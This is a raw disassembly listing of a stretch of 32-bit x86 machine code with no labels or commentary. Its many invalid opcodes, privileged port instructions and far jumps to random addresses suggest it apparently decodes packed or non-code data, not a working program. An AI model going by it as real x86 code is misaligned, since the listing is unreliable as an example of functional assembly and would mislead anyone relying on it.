  41a9b5:	adc    BYTE PTR [esi+0x6294a43],al
  41a9bb:	push   ss
  41a9bc:	dec    ebp
  41a9bd:	stos   DWORD PTR es:[edi],eax
  41a9be:	dec    esi
  41a9bf:	arpl   WORD PTR [esi],si
  41a9c1:	in     eax,0x95
  41a9c3:	gs adc al,0xe0
  41a9c6:	mov    eax,0x1f8ea254
  41a9cb:	inc    edx
  41a9cc:	ds dec esi
  41a9ce:	call   DWORD PTR ss:[edx-0x9]
  41a9d3:	inc    edi
  41a9d4:	inc    BYTE PTR [ebp+0x37af3118]
  41a9da:	(bad)  
  41a9dc:	or     BYTE PTR [eax-0x49bfa8f3],bl
  41a9e2:	jns    0x41a9d8
  41a9e4:	fimul  DWORD PTR [eax-0x3f4fee6]
  41a9ea:	pop    eax
  41a9eb:	xlat   BYTE PTR ds:[ebx]
  41a9ec:	inc    edx
  41a9ed:	(bad)  
  41a9ee:	loope  0x41aa3c
  41a9f0:	cmp    bl,dl
  41a9f2:	inc    ebx
  41a9f3:	adc    al,BYTE PTR [edx]
  41a9f5:	jns    0x41aa33
  41a9f7:	out    dx,eax
  41a9f8:	xor    esi,ebp
  41a9fa:	ins    DWORD PTR es:[edi],dx
  41a9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fc:	ins    DWORD PTR es:[edi],dx
  41a9fd:	frstor [edi+0x1d54f60a]
  41aa03:	xchg   edx,eax
  41aa04:	sbb    BYTE PTR [ecx+0x76],ch
  41aa07:	leave  
  41aa08:	mov    dh,0x18
  41aa0a:	mov    esi,0x93f7384b
  41aa0f:	retf   0x382b
  41aa12:	(bad)  [ebp-0x5089c018]
  41aa18:	pusha  
  41aa19:	add    ebp,DWORD PTR [edx+0x20005e3f]
  41aa1f:	xor    DWORD PTR [ebp+0x45],0xe77ec282
  41aa26:	aas    
  41aa27:	dec    eax
  41aa28:	cld    
  41aa29:	shr    ebp,1
  41aa2b:	(bad)  
  41aa2c:	dec    esp
  41aa2d:	frstor [ebp+0x1e]
  41aa30:	leave  
  41aa31:	cwde   
  41aa32:	push   ds
  41aa33:	jb     0x41a9c3
  41aa35:	arpl   WORD PTR [esi+0x6c],bp
  41aa38:	inc    ebx
  41aa39:	push   es
  41aa3a:	js     0x41a9f1
  41aa3c:	dec    esp
  41aa3d:	enter  0x64c,0xfd
  41aa41:	pop    ss
  41aa42:	jb     0x41a9d3
  41aa44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa45:	fmul   DWORD PTR [edx+0x20]
  41aa48:	inc    eax
  41aa49:	push   ebp
  41aa4a:	and    esi,DWORD PTR [ecx+eiz*2-0x65]
  41aa4e:	outs   dx,DWORD PTR ds:[esi]
  41aa4f:	iret   
  41aa50:	pop    ebx
  41aa51:	out    dx,eax
  41aa52:	daa    
  41aa53:	popf   
  41aa54:	xchg   BYTE PTR [esp+edx*1],dl
  41aa57:	jmp    0x5660b01a
  41aa5c:	into   
  41aa5d:	push   ss
  41aa5e:	jmp    0x41aa41
  41aa60:	dec    ebx
  41aa61:	inc    ecx
  41aa62:	dec    ebp
  41aa63:	inc    edx
  41aa64:	bound  ecx,QWORD PTR [edi]
  41aa66:	xor    al,0x6a
  41aa68:	xor    cl,0x9c
  41aa6b:	retf   
  41aa6c:	shl    BYTE PTR [ebx-0x2b],1
  41aa6f:	inc    BYTE PTR [ecx-0x17]
  41aa72:	andnps xmm0,XMMWORD PTR [ebp-0x17aa6e63]
  41aa79:	mov    bh,0xc1
  41aa7b:	call   0xf271930c
  41aa80:	and    al,BYTE PTR [edx]
  41aa82:	adc    bh,BYTE PTR [edx+0x67]
  41aa85:	retf   0xa5a5
  41aa88:	lods   eax,DWORD PTR ds:[esi]
  41aa89:	xchg   edi,eax
  41aa8a:	cmp    DWORD PTR [edx],esp
  41aa8c:	sub    BYTE PTR [ebx+0x59395641],0x42
  41aa93:	ret    0x34f5
  41aa96:	jecxz  0x41aa92
  41aa98:	in     al,0xf
  41aa9a:	sub    bh,BYTE PTR ds:0xb9f6d399
  41aaa0:	push   0x7ba2f622
  41aaa5:	mov    ss,WORD PTR [eax-0x2a]
  41aaa8:	enter  0xbb91,0xfe
  41aaac:	in     al,dx
  41aaad:	mov    BYTE PTR cs:[ebx+0x3c],ah
  41aab1:	mov    ebp,0x6367ed2e
  41aab6:	sub    eax,DWORD PTR [ebp-0x33]
  41aab9:	mov    esp,0x4090610a
  41aabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aabf:	inc    ecx
  41aac0:	mov    bl,BYTE PTR [ebx-0x3f0051c5]
  41aac6:	pop    edi
  41aac7:	ds jecxz 0x41aa58
  41aaca:	mov    esi,0xfb2bfeff
  41aacf:	out    0x87,al
  41aad1:	mov    al,0xd4
  41aad3:	sub    BYTE PTR [ebx-0x76e6ad36],cl
  41aad9:	inc    esi
  41aada:	sti    
  41aadb:	ss mov dh,0xb1
  41aade:	xor    al,0x1f
  41aae0:	stos   DWORD PTR es:[edi],eax
  41aae1:	call   0xc36f:0x5142f04e
  41aae8:	push   es
  41aae9:	xchg   edx,eax
  41aaea:	mov    WORD PTR [ebx-0x5cc3450b],fs
  41aaf0:	push   ebp
  41aaf1:	inc    ebp
  41aaf2:	std    
  41aaf3:	cmp    edx,esp
  41aaf5:	pop    ebx
  41aaf6:	ja     0x41aa9f
  41aaf8:	sub    esi,edx
  41aafa:	xor    ch,BYTE PTR [ecx+0x13]
  41aafd:	inc    edi
  41aafe:	xchg   ecx,eax
  41aaff:	or     DWORD PTR [eax-0x31d693ec],eax
  41ab05:	and    al,0x58
  41ab07:	aad    0x9d
  41ab09:	push   edx
  41ab0a:	int3   
  41ab0b:	mov    dl,0xf2
  41ab0d:	jae    0x41ab14
  41ab0f:	xchg   edi,eax
  41ab10:	into   
  41ab11:	test   DWORD PTR [eax+0x3b],eax
  41ab14:	aam    0x44
  41ab16:	aad    0xda
  41ab18:	adc    BYTE PTR [edi+0x5deae890],ch
  41ab1e:	xor    eax,0xd0f8256d
  41ab23:	lods   al,BYTE PTR ds:[esi]
  41ab24:	pop    ebp
  41ab25:	iret   
  41ab26:	inc    edx
  41ab27:	cli    
  41ab28:	mov    dh,0xff
  41ab2a:	push   edx
  41ab2b:	add    al,0x1
  41ab2d:	test   eax,0xf14299dc
  41ab32:	push   esp
  41ab33:	xor    al,0x88
  41ab35:	data16 jge 0x41aba9
  41ab38:	scas   al,BYTE PTR es:[edi]
  41ab39:	mov    esp,DWORD PTR [edx]
  41ab3b:	lods   eax,DWORD PTR ds:[esi]
  41ab3c:	into   
  41ab3d:	out    dx,al
  41ab3e:	jno    0x41ab8e
  41ab40:	cwde   
  41ab41:	test   al,0x23
  41ab43:	inc    ecx
  41ab44:	out    0x67,al
  41ab46:	out    0xee,al
  41ab48:	jae    0x41aba7
  41ab4a:	xchg   esp,eax
  41ab4b:	ins    BYTE PTR es:[edi],dx
  41ab4c:	enter  0x2a9e,0x89
  41ab50:	adc    al,0x52
  41ab52:	mov    edi,0x4c598fe1
  41ab57:	call   0x61166d60
  41ab5c:	mov    bl,BYTE PTR [eax+0xc0b44e4]
  41ab62:	xlat   BYTE PTR ds:[ebx]
  41ab63:	and    esp,esi
  41ab65:	dec    ebp
  41ab66:	adc    al,0xea
  41ab68:	lock idiv DWORD PTR [edx-0x7a]
  41ab6c:	dec    esi
  41ab6d:	pop    ds
  41ab6e:	or     dh,ch
  41ab70:	imul   ecx,edx,0x1b
  41ab73:	les    esp,FWORD PTR [ecx-0x7e]
  41ab76:	push   edi
  41ab77:	xchg   edx,eax
  41ab78:	jnp    0x41abf2
  41ab7a:	and    BYTE PTR [edx],al
  41ab7c:	rcl    DWORD PTR [ebx-0x4a432f90],1
  41ab82:	sub    ebx,DWORD PTR [ecx]
  41ab84:	jmp    0x41ab23
  41ab86:	retf   0x7a40
  41ab89:	pop    eax
  41ab8a:	aas    
  41ab8b:	scas   eax,DWORD PTR es:[edi]
  41ab8c:	fwait
  41ab8d:	jbe    0x41abf1
  41ab8f:	data16 mov ch,bl
  41ab92:	sub    ah,BYTE PTR [esp+edx*4-0x2453d1aa]
  41ab99:	jge    0x41ab4c
  41ab9b:	mov    esi,0x32209193
  41aba0:	cwde   
  41aba1:	(bad)  
  41aba2:	or     BYTE PTR [esi],dl
  41aba4:	(bad)  
  41aba5:	icebp  
  41aba6:	dec    edi
  41aba7:	mov    ds:0xa8efbd0a,eax
  41abac:	into   
  41abad:	push   0xffffffaa
  41abaf:	xor    BYTE PTR [ebx+0x1a9ec635],bl
  41abb5:	jbe    0x41abe5
  41abb7:	mov    al,al
  41abb9:	jns    0x41ac29
  41abbb:	push   ebx
  41abbc:	out    0x9e,eax
  41abbe:	je     0x41abcc
  41abc0:	and    BYTE PTR ds:0xcc6b8931,dl
  41abc6:	scas   al,BYTE PTR es:[edi]
  41abc7:	jg     0x41ab8f
  41abc9:	and    eax,0x2866ed66
  41abce:	pop    esi
  41abcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd0:	mov    bl,0x30
  41abd2:	cmp    al,0x26
  41abd4:	lods   al,BYTE PTR ds:[esi]
  41abd5:	mov    eax,0x5e20f9bc
  41abda:	pop    es
  41abdb:	push   esp
  41abdc:	dec    ebp
  41abdd:	mov    ecx,0x94af4e18
  41abe2:	aas    
  41abe3:	dec    edi
  41abe4:	jmp    0xa74f:0x3371d07d
  41abeb:	(bad)  
  41abec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abed:	loop   0x41ab88
  41abef:	xor    DWORD PTR [ebx],esp
  41abf1:	mov    edi,0x269748b1
  41abf6:	pop    ebp
  41abf7:	rcl    ebx,0x8
  41abfa:	sub    ebp,DWORD PTR [edi-0x2b]
  41abfd:	add    DWORD PTR [eax+0x190e9db1],esi
  41ac03:	jnp    0x41abe5
  41ac05:	pop    es
  41ac06:	xor    esi,DWORD PTR [edi]
  41ac08:	(bad)  
  41ac09:	je     0x41abdf
  41ac0b:	inc    ebx
  41ac0c:	jmp    0xf79914ab
  41ac11:	xchg   esi,eax
  41ac12:	pop    ss
  41ac13:	pop    es
  41ac14:	and    DWORD PTR [eax-0x33],0xd
  41ac18:	sbb    eax,0x377fe6c5
  41ac1d:	(bad)  
  41ac1e:	int3   
  41ac1f:	push   eax
  41ac20:	out    dx,al
  41ac21:	mov    bh,0x8
  41ac23:	stos   DWORD PTR es:[edi],eax
  41ac24:	(bad)  
  41ac25:	dec    edi
  41ac26:	clc    
  41ac27:	mov    esp,0x28f343ce
  41ac2c:	inc    eax
  41ac2d:	push   edi
  41ac2e:	ret    0x140
  41ac31:	daa    
  41ac32:	sbb    eax,0xe7394b15
  41ac37:	push   esp
  41ac38:	stos   DWORD PTR es:[edi],eax
  41ac39:	outs   dx,DWORD PTR ds:[esi]
  41ac3a:	jns    0x41ac86
  41ac3c:	or     esi,DWORD PTR [esi+0x3a11325f]
  41ac42:	mov    ?,WORD PTR [esi+0x2cb19ed5]
  41ac48:	mov    cl,0x16
  41ac4a:	pushf  
  41ac4b:	ins    BYTE PTR es:[edi],dx
  41ac4c:	sub    al,0x9f
  41ac4e:	cmp    eax,0xc77c6d2d
  41ac53:	xchg   ebp,eax
  41ac54:	jb     0x41ac3f
  41ac56:	jecxz  0x41aca2
  41ac58:	call   0x2333d08e
  41ac5d:	std    
  41ac5e:	iret   
  41ac5f:	jb     0x41acb6
  41ac61:	add    eax,0xdffc65d5
  41ac66:	xchg   BYTE PTR [edx],cl
  41ac68:	add    al,0x21
  41ac6a:	and    BYTE PTR [ebx-0x35],ah
  41ac6d:	rol    BYTE PTR [edi],0x45
  41ac70:	cmp    edi,DWORD PTR [eax]
  41ac72:	push   ss
  41ac73:	xor    BYTE PTR [eax+0x6dccc928],0xfc
  41ac7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac7b:	and    BYTE PTR [eax+0x5f4ad1f7],dl
  41ac81:	leave  
  41ac82:	adc    ecx,DWORD PTR [edi]
  41ac84:	xlat   BYTE PTR ds:[ebx]
  41ac85:	push   edx
  41ac86:	and    esi,ecx
  41ac88:	and    bh,BYTE PTR [esp+ebp*4]
  41ac8b:	dec    ecx
  41ac8c:	jmp    0xc79ed793
  41ac91:	scas   al,BYTE PTR es:[edi]
  41ac92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac93:	cli    
  41ac94:	popa   
  41ac95:	xchg   edi,eax
  41ac96:	add    eax,0xa3cde31
  41ac9b:	mov    esi,0xfede8d97
  41aca0:	jmp    0x9a0ce562
  41aca5:	aam    0x28
  41aca7:	pop    edx
  41aca8:	dec    edi
  41aca9:	jo     0x41ac3d
  41acab:	pop    edi
  41acac:	xor    eax,0x72aa028e
  41acb1:	push   ebp
  41acb2:	loopne 0x41ad18
  41acb4:	xchg   BYTE PTR [ecx],bl
  41acb6:	push   cs
  41acb7:	mov    eax,ds:0x5e16ff9c
  41acbc:	inc    eax
  41acbd:	jno    0x41aca6
  41acbf:	into   
  41acc0:	fnstcw WORD PTR [ebx]
  41acc2:	and    dh,al
  41acc4:	xor    bl,bh
  41acc6:	or     eax,0xb341d5f5
  41accb:	sbb    dl,ch
  41accd:	in     eax,dx
  41acce:	and    eax,0x7740bbb6
  41acd3:	(bad)  
  41acd6:	cdq    
  41acd7:	imul   edx,DWORD PTR [eax-0x4e],0x6b
  41acdb:	std    
  41acdc:	pop    ebp
  41acdd:	(bad)  
  41acde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acdf:	sbb    eax,0x14b8e1f7
  41ace4:	inc    eax
  41ace5:	pusha  
  41ace6:	punpckhwd mm3,QWORD PTR [edx+0x6f8957a]
  41aced:	scas   eax,DWORD PTR es:[edi]
  41acee:	ss enter 0x438c,0x28
  41acf3:	sbb    al,0x7
  41acf5:	mov    ch,0x10
  41acf7:	loope  0x41ad07
  41acf9:	test   eax,0xf9484489
  41acfe:	addr16 inc ebp
  41ad00:	xor    eax,DWORD PTR [eax-0x32843696]
  41ad06:	mov    eax,ds:0x4c9d69cd
  41ad0b:	cmp    al,0x96
  41ad0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad0e:	(bad)  
  41ad0f:	push   edi
  41ad10:	cmp    bl,bl
  41ad12:	mov    cl,0x7
  41ad14:	mov    ecx,0xccda70aa
  41ad19:	out    dx,al
  41ad1a:	adc    bh,ch
  41ad1c:	cwde   
  41ad1d:	pop    edi
  41ad1e:	or     cl,BYTE PTR [edx-0x51]
  41ad21:	push   esp
  41ad22:	cmp    ebp,ecx
  41ad24:	cs dec ebx
  41ad26:	loopne 0x41ad7d
  41ad28:	mov    bh,BYTE PTR [ebx]
  41ad2a:	dec    esp
  41ad2b:	inc    edi
  41ad2c:	jge    0x41acb6
  41ad2e:	adc    DWORD PTR [ebx],0x7b6f61d6
  41ad34:	adc    DWORD PTR [ebp-0x38],0xe4b2e00f
  41ad3b:	xor    eax,0xe459dbe0
  41ad40:	es pop ds
  41ad42:	xchg   ebx,eax
  41ad43:	sbb    dl,BYTE PTR [ecx+0x15]
  41ad46:	out    0x96,eax
  41ad48:	jb     0x41ad14
  41ad4a:	inc    edi
  41ad4b:	test   ebx,edi
  41ad4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4e:	cdq    
  41ad4f:	das    
  41ad50:	je     0x41ad53
  41ad52:	(bad)  
  41ad53:	fisttp DWORD PTR [esp+eax*2-0x48]
  41ad57:	scas   eax,DWORD PTR es:[edi]
  41ad58:	cmc    
  41ad59:	pop    es
  41ad5a:	mov    dl,0x2
  41ad5d:	and    al,0xc3
  41ad5f:	call   0x9ca2:0xd0f3b333
  41ad66:	sub    eax,0x47439119
  41ad6b:	out    dx,eax
  41ad6c:	jb     0x41ad2d
  41ad6e:	adc    BYTE PTR [esi-0x10],dh
  41ad71:	daa    
  41ad72:	cmp    eax,DWORD PTR [edi]
  41ad74:	fidivr WORD PTR ds:0x4af2a1e4
  41ad7a:	cli    
  41ad7b:	popa   
  41ad7c:	out    dx,al
  41ad7d:	cmp    BYTE PTR [ebx-0x72a8e36f],0x22
  41ad84:	loopne 0x41ada5
  41ad86:	fwait
  41ad87:	cld    
  41ad88:	cmp    ebx,DWORD PTR [ecx+0x6c7ca3f3]
  41ad8e:	pop    ecx
  41ad8f:	and    eax,0x4878e0f1
  41ad94:	add    ah,BYTE PTR [ebx]
  41ad96:	test   BYTE PTR [esp+ebp*8+0x4d],ch
  41ad9a:	int    0xca
  41ad9c:	sbb    eax,0x1d2cd77f
  41ada1:	gs addr16 (bad) 
  41ada4:	stos   DWORD PTR es:[edi],eax
  41ada5:	int3   
  41ada6:	ret    0x809f
  41ada9:	sar    BYTE PTR [ebx+0x79e43df0],0x8a
  41adb0:	or     BYTE PTR [ecx+ebx*1-0x69],ch
  41adb4:	or     dh,BYTE PTR [esi+0x22]
  41adb7:	dec    ebx
  41adb8:	fcomp  QWORD PTR [ebx-0x65]
  41adbb:	sub    BYTE PTR [ecx+edi*8-0x3e],bl
  41adbf:	sub    eax,eax
  41adc1:	push   0x297828e4
  41adc6:	nop
  41adc7:	adc    DWORD PTR ds:[edi],eax
  41adca:	mov    ch,0xa1
  41adcc:	xlat   BYTE PTR ds:[ebx]
  41adcd:	mov    ecx,0x62ea0e1d
  41add2:	pop    ss
  41add3:	leave  
  41add4:	call   0xc362408d
  41add9:	std    
  41adda:	cwde   
  41addb:	mov    bl,0x32
  41addd:	mov    al,0xf3
  41addf:	pop    esi
  41ade0:	adc    al,0x9c
  41ade2:	ret    
  41ade3:	(bad)  
  41ade4:	jmp    0x41ad86
  41ade6:	dec    eax
  41ade7:	mov    DWORD PTR [edx+ebp*1-0xb9143d],0x53a9383f
  41adf2:	or     al,0xc1
  41adf4:	mov    ah,BYTE PTR [eax+0x33e3f44d]
  41adfa:	mov    ch,0xf7
  41adfc:	dec    ecx
  41adfd:	dec    esp
  41adfe:	icebp  
  41adff:	repnz mov al,ds:0xdc8d2d90
  41ae05:	arpl   sp,bp
  41ae07:	dec    ebx
  41ae08:	pop    esi
  41ae09:	mov    eax,ds:0xac391563
  41ae0e:	shl    BYTE PTR [edx-0x1b],1
  41ae11:	hlt    
  41ae12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae13:	test   eax,0x63786469
  41ae18:	ret    
  41ae19:	inc    bp
  41ae1b:	push   cs
  41ae1c:	mov    gs,WORD PTR [edx]
  41ae1e:	je     0x41ae70
  41ae20:	nop
  41ae21:	or     BYTE PTR [ecx-0x58a0c615],0x61
  41ae28:	fisubr WORD PTR [ecx-0x61bbfd9b]
  41ae2e:	mov    edx,es
  41ae30:	cs gs jno 0x41ae6c
  41ae34:	fwait
  41ae35:	mov    ecx,0xecd9895e
  41ae3a:	mov    edi,DWORD PTR [edx+0x47]
  41ae3d:	xor    al,0xe1
  41ae3f:	or     BYTE PTR [ecx],ch
  41ae41:	data16 mov al,0x76
  41ae44:	or     al,0xff
  41ae46:	js     0x41ae92
  41ae48:	push   edx
  41ae49:	adc    bl,bl
  41ae4b:	mov    esp,0x7ff22609
  41ae50:	push   eax
  41ae51:	std    
  41ae52:	cdq    
  41ae53:	push   edx
  41ae54:	in     eax,0xad
  41ae56:	cdq    
  41ae57:	jecxz  0x41aeb0
  41ae59:	pop    ebx
  41ae5a:	(bad)  
  41ae5b:	jmp    0xcdbc9ac0
  41ae60:	inc    ebp
  41ae61:	pop    esi
  41ae62:	addr16 sbb ah,bl
  41ae65:	and    BYTE PTR [edi],0xfe
  41ae68:	push   ds
  41ae69:	cmp    BYTE PTR [ebx+0x35110799],bh
  41ae6f:	dec    BYTE PTR [edx-0x68]
  41ae72:	test   BYTE PTR [ebx+0x0],cl
  41ae75:	ins    BYTE PTR es:[edi],dx
  41ae76:	shr    ebx,1
  41ae78:	xchg   esp,eax
  41ae79:	aaa    
  41ae7a:	test   edx,edx
  41ae7c:	jecxz  0x41aef1
  41ae7e:	(bad)  
  41ae7f:	jecxz  0x41ae44
  41ae81:	pusha  
  41ae82:	(bad)  
  41ae83:	les    ebx,FWORD PTR [edx]
  41ae85:	mov    dl,0x92
  41ae87:	mov    al,0x4c
  41ae89:	mov    ds:0x6a3f924a,al
  41ae8e:	mov    al,ds:0x82afdc40
  41ae93:	and    al,dh
  41ae95:	xchg   BYTE PTR [edx-0x53],bl
  41ae98:	inc    ebx
  41ae99:	dec    ebx
  41ae9a:	mov    DWORD PTR [esi],esi
  41ae9c:	add    BYTE PTR [eax],cl
  41ae9e:	pop    ebx
  41ae9f:	and    BYTE PTR [edx+0x4b658ccc],al
  41aea5:	or     dh,BYTE PTR [esi]
  41aea7:	pop    ds
  41aea8:	cmp    esi,ebx
  41aeaa:	sub    BYTE PTR [ecx-0x195364e5],dl
  41aeb0:	(bad)  
  41aeb2:	hlt    
  41aeb3:	ds pop ebx
  41aeb5:	and    DWORD PTR [edx-0x1f],ecx
  41aeb8:	dec    edx
  41aeb9:	scas   eax,DWORD PTR es:[edi]
  41aeba:	retf   
  41aebb:	js     0x41ae6e
  41aebd:	inc    esp
  41aebe:	xchg   ebx,eax
  41aebf:	xchg   edi,eax
  41aec0:	push   es
  41aec1:	jl     0x41af26
  41aec3:	inc    esi
  41aec4:	das    
  41aec5:	ja     0x41aea9
  41aec7:	shr    edx,1
  41aec9:	mov    dh,0x9
  41aecb:	fmul   st(4),st
  41aecd:	push   0xa770e682
  41aed2:	and    cl,cl
  41aed4:	mov    bh,0x95
  41aed6:	jg     0x41ae83
  41aed8:	outs   dx,DWORD PTR ds:[esi]
  41aed9:	jmp    0x76f1:0xb5a42b2f
  41aee0:	ds mov bh,0xe4
  41aee3:	jno    0x41af1a
  41aee5:	popf   
  41aee6:	or     BYTE PTR [edi-0x67e1dd03],al
  41aeec:	jmp    0x41aebf
  41aeee:	xchg   ebp,eax
  41aeef:	test   BYTE PTR [ebp-0x2cde5fa9],ch
  41aef5:	adc    eax,0xd4fe04b
  41aefa:	mov    bl,0xb0
  41aefc:	add    eax,0x79a574f7
  41af01:	test   DWORD PTR [eax+0x110f6e81],eax
  41af07:	dec    edi
  41af08:	leave  
  41af09:	mov    al,ds:0xe78c3ed1
  41af0e:	or     al,0x3c
  41af10:	mov    edx,0x6396c686
  41af15:	in     eax,dx
  41af16:	imul   esp,ebx,0x4b9bc5f
  41af1c:	aaa    
  41af1d:	inc    esp
  41af1e:	push   cs
  41af1f:	push   esp
  41af20:	inc    esi
  41af21:	call   0x2eb3bac0
  41af26:	mov    edx,0x2329a98c
  41af2b:	cmp    ah,BYTE PTR ds:0x82afb26d
  41af31:	sub    DWORD PTR [edx],edx
  41af33:	and    eax,0xf9aa945b
  41af38:	dec    ecx
  41af39:	sbb    eax,0xd6bb236f
  41af3e:	mov    esp,0x59b2eebe
  41af43:	mov    BYTE PTR [esi-0x577573bd],dl
  41af49:	imul   ebp,DWORD PTR [eax],0x6e
  41af4c:	and    DWORD PTR [ecx],0xb3cf2fdf
  41af52:	test   DWORD PTR [eax],ebp
  41af54:	sbb    eax,0xb2f6f789
  41af59:	or     eax,0x2515d195
  41af5e:	daa    
  41af5f:	push   edx
  41af60:	mov    es,ebx
  41af62:	lds    esi,FWORD PTR [ecx+0xb]
  41af65:	cdq    
  41af66:	(bad)  
  41af67:	fcomp  st(2)
  41af69:	cmp    edi,DWORD PTR [ebx]
  41af6b:	xor    ah,bh
  41af6d:	nop
  41af6e:	in     eax,0x8e
  41af70:	rol    BYTE PTR [ecx+0x40b30b77],cl
  41af76:	xchg   esp,eax
  41af77:	call   0xafa8:0x412a951c
  41af7e:	sub    eax,0x6632e2c1
  41af83:	or     al,BYTE PTR [eax+0x69e70cec]
  41af89:	push   ebp
  41af8a:	arpl   WORD PTR [ecx],ax
  41af8c:	imul   edx,DWORD PTR ds:0x2d8b2caf,0x132a5d7f
  41af96:	test   BYTE PTR [edi-0x26],bh
  41af99:	bound  ecx,QWORD PTR [ecx+0x58]
  41af9c:	inc    edx
  41af9d:	iret   
  41af9e:	jns    0x41af57
  41afa0:	adc    ebx,DWORD PTR [ebp-0x5b]
  41afa3:	lea    esi,[esi-0x1bdfcdb]
  41afa9:	or     eax,DWORD PTR [ecx+ecx*1]
  41afac:	loop   0x41af5f
  41afae:	xchg   BYTE PTR [edi],dh
  41afb0:	test   eax,0x93f0d42f
  41afb5:	add    ebx,edi
  41afb7:	call   0x8e9ac603
  41afbc:	ds neg bl
  41afbf:	pop    ss
  41afc0:	cmp    DWORD PTR [ecx],edi
  41afc2:	and    al,0x4a
  41afc4:	das    
  41afc5:	in     eax,dx
  41afc6:	pop    edx
  41afc7:	xor    al,0xec
  41afc9:	pop    eax
  41afca:	fadd   st,st(0)
  41afcd:	mov    bl,0x53
  41afcf:	jl     0x41afee
  41afd1:	mov    bh,0x2
  41afd3:	enter  0x82e8,0xb1
  41afd7:	test   eax,0x4c6a6312
  41afdc:	test   ebp,eax
  41afde:	xchg   BYTE PTR [esi+eiz*1+0x310fe01b],dh
  41afe5:	fwait
  41afe6:	test   BYTE PTR [esi],dl
  41afe8:	pop    ds
  41afe9:	out    0x25,al
  41afeb:	adc    edi,DWORD PTR [eax+eiz*2-0x54]
  41afef:	push   ecx
  41aff0:	out    dx,al
  41aff1:	je     0x41af7d
  41aff3:	mov    al,fs:0xf1567b4f
  41aff9:	ss loope 0x41b027
  41affc:	sub    ecx,ecx
  41affe:	inc    DWORD PTR [ecx-0x6f]
  41b001:	ja     0x41b073
  41b003:	sub    al,0xf7
  41b005:	xchg   ebx,eax
  41b006:	in     eax,0xe2
  41b008:	cmp    DWORD PTR [eax-0x4e],esi
  41b00b:	jl     0x41aff1
  41b00d:	sub    esp,DWORD PTR [edx+0x28]
  41b010:	ins    DWORD PTR es:[edi],dx
  41b011:	test   eax,0x32aba932
  41b016:	daa    
  41b017:	loope  0x41b08b
  41b019:	pop    ss
  41b01a:	and    al,0x32
  41b01c:	xchg   ebp,eax
  41b01d:	or     edx,ebx
  41b01f:	pop    esi
  41b020:	repz cbw 
  41b023:	int3   
  41b024:	fs cs push 0x6f
  41b028:	push   cs
  41b029:	sub    eax,0x9cd2d26c
  41b02e:	push   0x59
  41b030:	cmc    
  41b031:	in     eax,0x51
  41b033:	sti    
  41b034:	popf   
  41b035:	adc    eax,0xc8ffc3b2
  41b03a:	jnp    0x41b062
  41b03c:	pop    es
  41b03d:	in     eax,0xd0
  41b03f:	sbb    al,0xc6
  41b041:	rol    BYTE PTR [ebx-0x6f],cl
  41b044:	jp     0x41b09e
  41b046:	mov    ch,0x73
  41b048:	add    cl,BYTE PTR [ecx]
  41b04a:	xor    eax,0x98b6dad7
  41b04f:	mov    ebx,0x527f1709
  41b054:	cwde   
  41b055:	mov    esp,DWORD PTR [eax]
  41b057:	xor    edx,esi
  41b059:	or     BYTE PTR [ebx],bl
  41b05b:	pop    edi
  41b05c:	mov    cl,0xf1
  41b05e:	(bad)  
  41b05f:	xchg   ebx,eax
  41b060:	aad    0xed
  41b062:	and    ch,0x5e
  41b065:	int    0x3b
  41b067:	loopne 0x41b0b0
  41b069:	in     eax,0xf2
  41b06b:	adc    DWORD PTR [ecx+eiz*1],edi
  41b06e:	rcl    DWORD PTR [ebx],0xf7
  41b071:	mov    esi,0x897fd893
  41b076:	xchg   esi,eax
  41b077:	mov    ebx,fs
  41b079:	cwde   
  41b07a:	sub    DWORD PTR [edx+eiz*1-0x67ad0b53],ebx
  41b081:	repz (bad) 
  41b085:	adc    edx,edi
  41b087:	ror    BYTE PTR [ebx+ecx*2-0x698a0f21],cl
  41b08e:	out    dx,al
  41b08f:	mov    esi,0xca07cd23
  41b094:	bound  edx,QWORD PTR [edx+0x218f9da3]
  41b09a:	sub    eax,0x7bb9b01e
  41b09f:	xchg   BYTE PTR [esi+0x0],dh
  41b0a2:	xchg   esi,eax
  41b0a3:	mov    ch,0x2
  41b0a5:	imul   ecx
  41b0a7:	mov    dl,0x29
  41b0a9:	xchg   esp,eax
  41b0aa:	inc    eax
  41b0ab:	fwait
  41b0ac:	mov    WORD PTR [edx],?
  41b0ae:	xor    esi,DWORD PTR [eax+0x5]
  41b0b1:	xchg   ebx,eax
  41b0b2:	xchg   DWORD PTR [eax],esi
  41b0b4:	jne    0x41b0f1
  41b0b6:	inc    DWORD PTR [esi-0x5773759a]
  41b0bc:	loope  0x41b0db
  41b0be:	lahf   
  41b0bf:	add    eax,0x784b6936
  41b0c4:	ins    DWORD PTR es:[edi],dx
  41b0c5:	push   ebp
  41b0c6:	es sbb eax,0x11a56d59
  41b0cc:	call   0x338e:0x2a2ffe72
  41b0d3:	jge    0x41b145
  41b0d5:	adc    BYTE PTR [ebx-0x31],bh
  41b0d8:	and    al,BYTE PTR [ebx+0x3d]
  41b0db:	fist   WORD PTR [eax-0x7641825f]
  41b0e1:	xchg   edi,eax
  41b0e2:	cdq    
  41b0e3:	hlt    
  41b0e4:	push   cs
  41b0e5:	data16 jae 0x41b08d
  41b0e8:	iret   
  41b0e9:	test   eax,0xdb88beed
  41b0ee:	mov    al,0xbf
  41b0f0:	test   DWORD PTR [edi-0x7668b35f],edi
  41b0f6:	add    DWORD PTR [edx+ebp*1],ecx
  41b0f9:	popa   
  41b0fa:	jp     0x41b11d
  41b0fc:	ins    BYTE PTR es:[edi],dx
  41b0fd:	fsub   QWORD PTR [ecx]
  41b0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b100:	outs   dx,DWORD PTR ds:[esi]
  41b101:	outs   dx,DWORD PTR ds:[esi]
  41b102:	and    BYTE PTR ds:0x226fc69c,dh
  41b108:	in     eax,dx
  41b109:	inc    eax
  41b10a:	inc    ecx
  41b10b:	js     0x41b15a
